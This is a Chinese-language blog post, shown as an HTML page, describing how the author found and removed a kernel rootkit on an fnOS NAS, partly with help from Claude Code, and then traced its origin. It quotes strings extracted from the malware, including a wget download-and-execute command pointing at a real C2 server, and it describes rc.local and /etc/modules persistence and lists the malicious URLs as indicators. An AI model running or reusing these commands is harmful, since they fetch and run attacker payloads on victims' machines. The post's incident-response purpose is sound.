@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="本文记录了我的飞牛NAS遭受内核级Rootkit攻击的全过程，包括如何发现、分析、清除恶意软件，以及最终的溯源分析。希望能给其他fnOS用户提供参考。"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="breeze chan"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="记一次飞牛fnOS内核级Rootkit入侵事件：从发现到清除的完整过程"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="本文记录了我的飞牛NAS遭受内核级Rootkit攻击的全过程，包括如何发现、分析、清除恶意软件，以及最终的溯源分析。希望能给其他fnOS用户提供参考。"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="apple pie"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="https://scared-heart.github.io/img/banner.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="https://scared-heart.github.io/img/banner.jpg"/>
+
+
+<!-- Title -->
+
+<title>记一次飞牛fnOS内核级Rootkit入侵事件：从发现到清除的完整过程 | apple pie</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/favicon.ico"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">Breeze Chan</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/banner.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>记一次飞牛fnOS内核级Rootkit入侵事件：从发现到清除的完整过程</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+        <i class="far fa-bookmark fa-fw"></i>
+        
+
+<a href="/categories/%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6/">安全事件</a>
+
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2026-02-01
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <blockquote>
+<p>本文记录了我的飞牛NAS遭受内核级Rootkit攻击的全过程，包括如何发现、分析、清除恶意软件，以及最终的溯源分析。希望能给其他fnOS用户提供参考。</p>
+</blockquote>
+<p><strong>事件时间</strong>: 2026年1月31日 - 2月1日<br><strong>受影响系统</strong>: 飞牛fnOS (FNOS)<br><strong>威胁等级</strong>: 极高危（内核级Rootkit）<br><strong>最终结果</strong>: 成功清除，系统恢复正常</p>
+<hr>
+<h2 id="一、事件发现：小红书上的安全警告"><a href="#一、事件发现：小红书上的安全警告" class="headerlink" title="一、事件发现：小红书上的安全警告"></a>一、事件发现：小红书上的安全警告</h2><h3 id="1-1-朋友转发的帖子"><a href="#1-1-朋友转发的帖子" class="headerlink" title="1.1 朋友转发的帖子"></a>1.1 朋友转发的帖子</h3><p>2026年1月31日晚，我像往常一样玩claude，突然朋友转发了一篇让我心惊的帖子：</p>
+<blockquote>
+<p><strong>🚨飞牛 fnOS 疑似遭大规模漏洞利用，请立刻关闭公网访问！</strong></p>
+<p>最近几天，飞牛 fnOS 用户反馈设备被远程控制、异常占网、上传异常文件。经过多位用户与安全团队分析，确认存在未授权访问漏洞，部分设备被植入后门，可能已被纳入僵尸网络用于发起攻击。</p>
+</blockquote>
+<p>帖子中提到的关键信息：</p>
+<ul>
+<li><strong>风险等级</strong>: 高危</li>
+<li><strong>影响版本</strong>: 官方未公布，疑似多个版本受影响</li>
+<li><strong>风险条件</strong>: 设备管理页面或端口被公网直接访问</li>
+<li><strong>已知攻击行为</strong>:<ul>
+<li>植入木马文件</li>
+<li>与 <code>45.95.212.102</code>、<code>151.240.13.91</code> 等服务器通信</li>
+<li>创建隐藏服务 <code>/sbin/gots</code>、<code>/usr/bin/nginx</code></li>
+<li>部分样本包含内核模块 <code>snd_pcap.ko</code></li>
+</ul>
+</li>
+</ul>
+<p>看到这里，我意识到情况可能很严重——我的fnOS是有公网访问的。</p>
+<h3 id="1-2-立即自查：CPU-100-！"><a href="#1-2-立即自查：CPU-100-！" class="headerlink" title="1.2 立即自查：CPU 100%！"></a>1.2 立即自查：CPU 100%！</h3><p>我立刻打开PVE（Proxmox Virtual Environment）查看fnOS虚拟机的状态。</p>
+<p><strong>结果让我倒吸一口凉气：CPU使用率100%！</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────────┐</span><br><span class="line">│  PVE 虚拟机监控面板                                      │</span><br><span class="line">├─────────────────────────────────────────────────────────┤</span><br><span class="line">│  VM: fnOS-NAS                                           │</span><br><span class="line">│  CPU: ████████████████████████████████████████ 100%    │</span><br><span class="line">│  内存: ██████████░░░░░░░░░░░░░░░░░░░░ 45%              │</span><br><span class="line">│  网络: 异常高流量                                        │</span><br><span class="line">└─────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下，我的NAS在空闲时CPU使用率应该在5%以下。100%的CPU占用明显不正常，很可能正在进行加密货币挖矿。</p>
+<p>我SSH登录到系统，使用<code>top</code>命令查看进程，但奇怪的是<strong>找不到任何高CPU占用的进程</strong>。这更加印证了我的担忧——这可能是一个会隐藏自身的Rootkit。</p>
+<hr>
+<h2 id="二、深入分析：发现内核级Rootkit"><a href="#二、深入分析：发现内核级Rootkit" class="headerlink" title="二、深入分析：发现内核级Rootkit"></a>二、深入分析：发现内核级Rootkit</h2><h3 id="2-1-借助Claude-Code进行分析"><a href="#2-1-借助Claude-Code进行分析" class="headerlink" title="2.1 借助Claude Code进行分析"></a>2.1 借助Claude Code进行分析</h3><p>面对这种复杂的安全事件，我决定使用Claude Code（Anthropic的CLI工具）来帮助我分析和清理系统。</p>
+<p>首先，我让Claude帮我扫描系统中的可疑文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描可疑的小文件（10-50KB，常见恶意软件大小）</span></span><br><span class="line">find /usr/bin /sbin -size +10k -size -50k -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-发现的恶意文件"><a href="#2-2-发现的恶意文件" class="headerlink" title="2.2 发现的恶意文件"></a>2.2 发现的恶意文件</h3><p>扫描结果触目惊心，发现了以下可疑文件：</p>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>文件路径</th>
+<th>大小</th>
+<th>MD5</th>
+<th>创建时间</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/sbin/gots</code></td>
+<td>14KB</td>
+<td>2808f5debbd7f4eca90f6242eb8811d5</td>
+<td>2026-01-31 23:42</td>
+</tr>
+<tr>
+<td><code>/usr/bin/dockers</code></td>
+<td>14KB</td>
+<td>f9a6e2f3ef067159774a7bcdb9fbb132</td>
+<td>2025-01-21 23:01</td>
+</tr>
+<tr>
+<td><code>/usr/bin/4Va</code></td>
+<td>14KB</td>
+<td>b6468a4813e05487ff6a686f466f81db</td>
+<td>2025-01-21 23:01</td>
+</tr>
+<tr>
+<td><code>/usr/bin/mNxc</code></td>
+<td>14KB</td>
+<td>49d33fae631fdf4f2ce220d343268aa2</td>
+<td>2025-01-22 00:16</td>
+</tr>
+<tr>
+<td><code>/usr/bin/reMYUBLt</code></td>
+<td>14KB</td>
+<td>05b041d90a8b4019f5711bed243cf16d</td>
+<td>2025-01-22 03:13</td>
+</tr>
+</tbody></table>
+<p>更可怕的是，我还发现了<strong>两个恶意内核模块</strong>：</p>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>模块路径</th>
+<th>大小</th>
+<th>MD5</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/lib/modules/6.12.18-trim/async_memcpys.ko</code></td>
+<td>6.4KB</td>
+<td>a26a90060f463d4e10bc558e6758d67e</td>
+</tr>
+<tr>
+<td><code>/lib/modules/6.12.18-trim/snd_pcap.ko</code></td>
+<td>6.5KB</td>
+<td>dc47eef59a495b378d363cb8d0c61fbd</td>
+</tr>
+</tbody></table>
+<h3 id="2-3-分析内核模块"><a href="#2-3-分析内核模块" class="headerlink" title="2.3 分析内核模块"></a>2.3 分析内核模块</h3><p>使用<code>strings</code>命令分析内核模块，发现了惊人的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ strings /lib/modules/6.12.18-trim/async_memcpys.ko</span><br></pre></td></tr></table></figure>
+
+<p>输出中包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://43.198.11.122/Fnos -O /tmp/Fnos</span><br><span class="line">chmod 777 /tmp/Fnos</span><br><span class="line">/tmp/Fnos</span><br><span class="line">rm -rf /tmp/Fnos</span><br><span class="line">call_usermodehelper</span><br></pre></td></tr></table></figure>
+
+<p>这是一个典型的<strong>内核级下载器</strong>！它使用<code>call_usermodehelper</code>在内核空间执行用户空间命令，从C2服务器下载并执行恶意载荷。</p>
+<p>另一个模块<code>snd_pcap.ko</code>也包含类似的代码，但连接的是另一个C2服务器<code>151.240.13.91</code>。</p>
+<h3 id="2-4-持久化机制分析"><a href="#2-4-持久化机制分析" class="headerlink" title="2.4 持久化机制分析"></a>2.4 持久化机制分析</h3><p>攻击者使用了多重持久化机制：</p>
+<p><strong>1. &#x2F;etc&#x2F;modules 自动加载内核模块</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># /etc/modules</span><br><span class="line">bonding</span><br><span class="line">msr</span><br><span class="line">async_memcpys    # 恶意模块！</span><br><span class="line">snd_pcap         # 恶意模块！</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. &#x2F;etc&#x2F;rc.local 启动恶意程序</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sbin/gots fnos &amp;</span><br><span class="line">/sbin/gots fnso &amp;</span><br><span class="line">/sbin/gots x86 &amp;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. immutable属性保护</strong></p>
+<p>攻击者还给<code>/sbin/gots</code>设置了immutable属性，并且<strong>删除了<code>/usr/bin/chattr</code>工具</strong>，防止管理员移除保护属性！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ lsattr /sbin/gots</span><br><span class="line">----i---------e------- /sbin/gots</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">which</span> chattr</span><br><span class="line"><span class="comment"># 找不到！被删除了！</span></span><br></pre></td></tr></table></figure>
+
+<p>这是我见过的最狡猾的反取证手段之一。</p>
+<hr>
+<h2 id="三、清除过程：与Rootkit的战斗"><a href="#三、清除过程：与Rootkit的战斗" class="headerlink" title="三、清除过程：与Rootkit的战斗"></a>三、清除过程：与Rootkit的战斗</h2><h3 id="3-1-恢复chattr工具"><a href="#3-1-恢复chattr工具" class="headerlink" title="3.1 恢复chattr工具"></a>3.1 恢复chattr工具</h3><p>首先要解决chattr被删除的问题。由于apt有依赖冲突，我选择手动下载e2fsprogs包提取chattr：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载e2fsprogs包</span></span><br><span class="line">wget https://mirrors.ustc.edu.cn/debian/pool/main/e/e2fsprogs/e2fsprogs_1.47.0-2+b2_amd64.deb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取chattr</span></span><br><span class="line">dpkg-deb -x e2fsprogs_1.47.0-2+b2_amd64.deb /tmp/e2fsprogs_extract</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /tmp/e2fsprogs_extract/usr/bin/chattr /usr/bin/chattr</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 755 /usr/bin/chattr</span><br></pre></td></tr></table></figure>
+
+<p>✅ chattr工具恢复成功！</p>
+<h3 id="3-2-移除immutable属性"><a href="#3-2-移除immutable属性" class="headerlink" title="3.2 移除immutable属性"></a>3.2 移除immutable属性</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> chattr -i /sbin/gots</span><br><span class="line"><span class="built_in">sudo</span> chattr -i /etc/rc.local</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-卸载恶意内核模块"><a href="#3-3-卸载恶意内核模块" class="headerlink" title="3.3 卸载恶意内核模块"></a>3.3 卸载恶意内核模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> modprobe -r async_memcpys</span><br><span class="line"><span class="built_in">sudo</span> modprobe -r snd_pcap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line">lsmod | grep -E <span class="string">&quot;snd_pcap|async_memcpys&quot;</span></span><br><span class="line"><span class="comment"># 无输出，卸载成功</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-删除恶意文件"><a href="#3-4-删除恶意文件" class="headerlink" title="3.4 删除恶意文件"></a>3.4 删除恶意文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除内核模块文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /lib/modules/6.12.18-trim/async_memcpys.ko</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /lib/modules/6.12.18-trim/snd_pcap.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除用户层恶意软件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /sbin/gots</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /usr/bin/dockers</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /usr/bin/4Va</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /usr/bin/mNxc</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /usr/bin/reMYUBLt</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-5-清理持久化配置"><a href="#3-5-清理持久化配置" class="headerlink" title="3.5 清理持久化配置"></a>3.5 清理持久化配置</h3><p><strong>清理&#x2F;etc&#x2F;modules：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;/async_memcpys/d&#x27;</span> /etc/modules</span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;/snd_pcap/d&#x27;</span> /etc/modules</span><br></pre></td></tr></table></figure>
+
+<p><strong>清理&#x2F;etc&#x2F;rc.local：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;/gots/d&#x27;</span> /etc/rc.local</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-6-封锁C2服务器"><a href="#3-6-封锁C2服务器" class="headerlink" title="3.6 封锁C2服务器"></a>3.6 封锁C2服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 封锁所有已知C2服务器</span></span><br><span class="line"><span class="built_in">sudo</span> iptables -A INPUT -s 43.198.11.122 -j DROP</span><br><span class="line"><span class="built_in">sudo</span> iptables -A OUTPUT -d 43.198.11.122 -j DROP</span><br><span class="line"><span class="built_in">sudo</span> iptables -A INPUT -s 151.240.13.91 -j DROP</span><br><span class="line"><span class="built_in">sudo</span> iptables -A OUTPUT -d 151.240.13.91 -j DROP</span><br><span class="line"><span class="built_in">sudo</span> iptables -A INPUT -s 20.89.168.131 -j DROP</span><br><span class="line"><span class="built_in">sudo</span> iptables -A OUTPUT -d 20.89.168.131 -j DROP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 持久化防火墙规则</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install iptables-persistent</span><br><span class="line"><span class="built_in">sudo</span> netfilter-persistent save</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-7-重建系统配置"><a href="#3-7-重建系统配置" class="headerlink" title="3.7 重建系统配置"></a>3.7 重建系统配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重建内核模块依赖</span></span><br><span class="line"><span class="built_in">sudo</span> depmod -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新initramfs（确保恶意模块不会在启动时加载）</span></span><br><span class="line"><span class="built_in">sudo</span> update-initramfs -u -k 6.12.18-trim</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-8-重启验证"><a href="#3-8-重启验证" class="headerlink" title="3.8 重启验证"></a>3.8 重启验证</h3><p>重启系统后，再次检查：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────────┐</span><br><span class="line">│  重启后验证结果                                          │</span><br><span class="line">├─────────────────────────────────────────────────────────┤</span><br><span class="line">│  ✅ 恶意内核模块: 未加载                                 │</span><br><span class="line">│  ✅ 恶意文件: 已删除                                     │</span><br><span class="line">│  ✅ 恶意进程: 无运行                                     │</span><br><span class="line">│  ✅ /etc/modules: 已清理                                │</span><br><span class="line">│  ✅ /etc/rc.local: 已清理                               │</span><br><span class="line">│  ✅ C2封锁规则: 已生效                                  │</span><br><span class="line">│  ✅ CPU使用率: 正常 (5%以下)                            │</span><br><span class="line">└─────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p><strong>CPU使用率恢复正常！</strong> 从100%降到5%以下，系统终于安静了。</p>
+<hr>
+<h2 id="四、溯源分析：谁是幕后黑手？"><a href="#四、溯源分析：谁是幕后黑手？" class="headerlink" title="四、溯源分析：谁是幕后黑手？"></a>四、溯源分析：谁是幕后黑手？</h2><h3 id="4-1-C2服务器分析"><a href="#4-1-C2服务器分析" class="headerlink" title="4.1 C2服务器分析"></a>4.1 C2服务器分析</h3><div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>IP地址</th>
+<th>位置</th>
+<th>服务商</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>43.198.11.122</td>
+<td>香港</td>
+<td>AWS EC2</td>
+<td>载荷下载服务器</td>
+</tr>
+<tr>
+<td>151.240.13.91</td>
+<td>香港</td>
+<td>IPXO（匿名IP服务）</td>
+<td>载荷下载服务器</td>
+</tr>
+<tr>
+<td>20.89.168.131</td>
+<td>日本东京</td>
+<td>Microsoft Azure</td>
+<td>持久化通信服务器</td>
+</tr>
+</tbody></table>
+<p>攻击者使用了三个不同云服务商的服务器，分布在香港和日本，体现了较高的运营安全意识。</p>
+<h3 id="4-2-攻击者真实IP"><a href="#4-2-攻击者真实IP" class="headerlink" title="4.2 攻击者真实IP"></a>4.2 攻击者真实IP</h3><p><strong>遗憾的是，攻击者的真实IP无法追踪</strong>。</p>
+<p>原因是攻击者清理了所有登录日志：</p>
+<ul>
+<li>wtmp记录被清除</li>
+<li>btmp记录被清除</li>
+<li>SSH日志无历史记录</li>
+<li>journald无相关时间段记录</li>
+</ul>
+<p>这是一个具有较强反取证意识的攻击者。</p>
+<h3 id="4-3-攻击时间线"><a href="#4-3-攻击时间线" class="headerlink" title="4.3 攻击时间线"></a>4.3 攻击时间线</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2025-01-21 23:01  │ 初始入侵，部署 dockers、4Va</span><br><span class="line">2025-01-22 00:16  │ 部署 mNxc</span><br><span class="line">2025-01-22 03:13  │ 部署 reMYUBLt</span><br><span class="line">2025-01-22 03:25  │ 部署 snd_pcap.ko 内核模块</span><br><span class="line">     ...          │ 潜伏期（约1年）</span><br><span class="line">2026-01-31 16:12  │ 部署 async_memcpys.ko 新内核模块</span><br><span class="line">2026-01-31 23:42  │ 部署 /sbin/gots，删除chattr</span><br><span class="line">2026-02-01 00:01  │ 我发现异常并开始清理</span><br><span class="line">2026-02-01 00:44  │ 清理完成</span><br></pre></td></tr></table></figure>
+
+<p><strong>我的系统被感染了整整一年才发现！</strong> 这让我非常后怕。</p>
+<h3 id="4-4-攻击者画像"><a href="#4-4-攻击者画像" class="headerlink" title="4.4 攻击者画像"></a>4.4 攻击者画像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌────────────────────────────────────────────────────────────────┐</span><br><span class="line">│                     攻击者画像                                  │</span><br><span class="line">├────────────────────────────────────────────────────────────────┤</span><br><span class="line">│  真实身份: 未知                                                 │</span><br><span class="line">│  技术水平: 高级 (内核级rootkit开发能力)                         │</span><br><span class="line">│  攻击动机: 加密货币挖矿 / 僵尸网络扩展                          │</span><br><span class="line">│  运营安全: 高 (多云C2、匿名IP服务、日志清理)                    │</span><br><span class="line">│  目标类型: NAS设备 (专门针对FNOS系统)                           │</span><br><span class="line">│  活动区域: 亚太地区 (香港、日本)                                │</span><br><span class="line">└────────────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p>根据小红书帖子和威胁情报分析：</p>
+<ul>
+<li>全球约<strong>30万台fnOS暴露公网</strong></li>
+<li>攻击者疑似<strong>2-3个团伙同时活动</strong></li>
+<li>已捕捉到<strong>DDoS攻击指令</strong></li>
+<li>被感染设备可能被用于<strong>发起攻击或挖矿</strong></li>
+</ul>
+<hr>
+<h2 id="五、IOC（入侵威胁指标）汇总"><a href="#五、IOC（入侵威胁指标）汇总" class="headerlink" title="五、IOC（入侵威胁指标）汇总"></a>五、IOC（入侵威胁指标）汇总</h2><h3 id="5-1-网络IOC"><a href="#5-1-网络IOC" class="headerlink" title="5.1 网络IOC"></a>5.1 网络IOC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># C2服务器</span><br><span class="line">43.198.11.122     # 香港 - AWS EC2</span><br><span class="line">151.240.13.91     # 香港 - IPXO</span><br><span class="line">20.89.168.131     # 日本东京 - Azure</span><br><span class="line">45.95.212.102     # 小红书帖子提到</span><br><span class="line"></span><br><span class="line"># 恶意URL</span><br><span class="line">http://43.198.11.122/Fnos</span><br><span class="line">http://151.240.13.91/Fnos</span><br><span class="line">http://20.89.168.131/nginx</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-文件IOC"><a href="#5-2-文件IOC" class="headerlink" title="5.2 文件IOC"></a>5.2 文件IOC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># MD5哈希</span><br><span class="line">a26a90060f463d4e10bc558e6758d67e  async_memcpys.ko</span><br><span class="line">dc47eef59a495b378d363cb8d0c61fbd  snd_pcap.ko</span><br><span class="line">2808f5debbd7f4eca90f6242eb8811d5  gots</span><br><span class="line">f9a6e2f3ef067159774a7bcdb9fbb132  dockers</span><br><span class="line">b6468a4813e05487ff6a686f466f81db  4Va</span><br><span class="line">49d33fae631fdf4f2ce220d343268aa2  mNxc</span><br><span class="line">05b041d90a8b4019f5711bed243cf16d  reMYUBLt</span><br><span class="line"></span><br><span class="line"># 恶意文件路径</span><br><span class="line">/lib/modules/*/async_memcpys.ko</span><br><span class="line">/lib/modules/*/snd_pcap.ko</span><br><span class="line">/sbin/gots</span><br><span class="line">/usr/bin/dockers</span><br><span class="line">/usr/bin/4Va</span><br><span class="line">/usr/bin/mNxc</span><br><span class="line">/usr/bin/reMYUBLt</span><br><span class="line">/usr/bin/nginx (小红书帖子提到)</span><br><span class="line">/tmp/Fnos</span><br></pre></td></tr></table></figure>
+
